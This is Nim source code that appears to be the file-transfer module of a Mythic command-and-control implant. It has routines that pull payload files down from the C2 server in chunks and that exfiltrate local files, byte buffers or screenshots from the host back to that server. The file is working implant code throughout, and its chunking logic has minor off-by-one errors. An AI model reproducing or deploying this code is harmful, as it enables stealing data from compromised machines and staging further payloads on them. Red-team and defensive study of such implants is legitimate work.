import structs
import config

import os
import json
import utils
import b64
import std/tables
import std/options


when defined(PROFILE_SMB):
  import profiles/smb as profile
else:
  import profiles/http as profile

var sharedBuffer*: Table[string, (int, pointer)]
var usedBytes* = 0

# to div using int64
proc `/`(x, y: int64): int64 = x div y


#[
  This will download a file from mythic (in various chunks, chunk size is 5mb at a time)
  -> This is the UPLOAD command (wording is confusing here)
]#
iterator downloadFileFromMythic*(fileUUID: string, taskId: string): Option[seq[byte]] =

  let CHUNK_SIZE: int64 = connection.transferBytesDown

  var
    resp = TaskResponse()
    initialFileReq = FileResponseUp()
    totalChunks: int


  resp.action = "post_response"
  initialFileReq.task_id = taskId
  initialFileReq.upload = FileUpload(
    chunk_size: CHUNK_SIZE,
    file_id: fileUUID,
    chunk_num: 1)

  # 1) Setup the initial request to obtain number of total chunks
  # + first chunk of data

  # Set the initial upload data

  resp.responses.add(%*initialFileReq)
  let firstChunk = sendAndRetrData(%*resp)

  # Extract the total number of chunks from
  # the response and yield the first data chunk to
  # the callee
  if firstChunk.isSome:
    try:
      let mainResp = firstChunk.get()["responses"][0]
      totalChunks = mainResp["total_chunks"].getInt
      yield some(cast[seq[byte]](b64.decode(Base64Pad, mainResp["chunk_data"].getStr())))
    except:
      DBG("[-] Something went wrong with the download")
      yield none(seq[byte])

  # 2) When the total number of chunks is known,
  # download all other chunks, one by one
  # This only works if there are 2 or more chunks
  if totalChunks >= 2:
    for chunk in 2..totalChunks:
      try:
        initialFileReq.upload.chunk_num = chunk
        resp.responses = @[%*initialFileReq]
        let contChunks = sendAndRetrData(%*resp)

        if contChunks.isSome:
          let mainResp = contChunks.get()["responses"][0]
          yield some(cast[seq[byte]](b64.decode(Base64Pad, mainResp["chunk_data"].getStr())))
      except:
        DBG("[-] Something went wrong with the download")
        yield none(seq[byte])


#[
  This function does the opposite, and is uploading a local
  file to the mythic server
  -> This is the DOWNLOAD command (wording is confusing here)

  can return the mythicFileId (parameter #4)
  Can upload data from a local file or from a byte buffer, the function
  diffs these two by checking the pathToFile parameter, if its an empty string ("")
  it will upload whatever is in the buffer (also chunked)

]#
proc uploadFileToMythic*(taskId: string, pathToFile: string, mythicFileId: var string, rawData= @[byte 0x00], isScreenshot=false): bool =

  let CHUNK_SIZE: int64 = connection.transferBytesDown

  var
    resp = TaskResponse()
    initialFileReq = FileResponseDown()
    chunkDataTask = TaskResponse()
    dataResponse = FileResponseDownContent()


  # get the filesize and calculate the
  # number of chunks that we are going
  # to send

  var
    fileSize: int64
    numOfChunks:int
    fileUUID: string
    uploadFromDisk: bool = false
    inpFile: File

  if pathToFile != "":
    fileSize = cast[int64](os.getFileSize(pathToFile))
    uploadFromDisk = true
  else:
    DBG("[*] Uploading from byte buffer")
    fileSize = len(rawData)

    # no file and empty buffe => error
    if fileSize == 0:
      return false

  numOfChunks = int(fileSize / CHUNK_SIZE) + 1

  # Craft the initial packet
  resp.action = "post_response"
  initialFileReq.task_id = taskId
  initialFileReq.download = FileDownload(
    full_path: pathToFile,
    total_chunks: numOfChunks,
    host: "",
    is_screenshot: isScreenshot
  )

  # 1) Setup the initial request to obtain a unique file_id from the server

  resp.responses.add(%*initialFileReq)
  let fileUploadResponse = sendAndRetrData(%*resp)

  if fileUploadResponse.isSome():
    let mainResp = fileUploadResponse.get()["responses"][0]
    if mainResp["status"].getStr() != "success":
      return false
    fileUUID = mainResp["file_id"].getStr

  else:
    return false

  chunkDataTask.action = "post_response"
  dataResponse.task_id = taskId
  dataResponse.download = FileDownloadContent()

  # set the mythicFile ID for the caller to have access to the id
  mythicFileId = fileUUID

  # Open the file in read mode
  if uploadFromDisk:
    inpFile = pathToFile.open(fmRead)

  DBG("There are " & $numOfChunks & " Chunks to upload")

  for i in 1..numOfChunks:

    var tmpBuffer = newSeq[byte](CHUNK_SIZE)
    let startIndex = (i-1) * CHUNK_SIZE
    # When dealing with a file on disk
    # read from the file and move the file pos to the
    # next index
    if uploadFromDisk:
      inpFile.setFilePos(startIndex, fspSet)
      let bytesRead =  inpFile.readBytes(tmpBuffer, 0, CHUNK_SIZE)

      # truncate the tmpBuffer in case for the last chunk,
      # where bytesRead < CHUNK_SIZE
      if bytesRead != CHUNK_SIZE:
        tmpBuffer = tmpBuffer[0..bytesRead]
    else:
      # when dealing with raw data, just use that buffer
      # also make sure to truncate if the CHUNK is larger
      # then the total size
      var endIdx = startIndex + CHUNKSIZE
      if endIdx >= len(rawData):
        endIdx = len(rawData)
      tmpBuffer = rawData[startIndex..<endIdx]

    # Craft the response packet
    dataResponse.download.chunk_num = i
    dataResponse.download.file_id = fileUUID
    dataResponse.download.chunk_data = b64.encode(Base64Pad, tmpBuffer)

    # Add the response and send to the server
    chunkDataTask.responses = @[%*dataResponse]

    let fileUploadResponse = sendAndRetrData(%*chunkDataTask)

    # check if the server accepted the chunk, if not, abort the download
    # procedure
    if fileUploadResponse.isSome():
      let mainResp = fileUploadResponse.get()["responses"][0]
      if mainResp["status"].getStr() != "success":
        return false

  return true



#[
  Return the shared buffer of the file-buffer
]#
#proc getBuffer*(): pointer =
#  return sharedBuffer

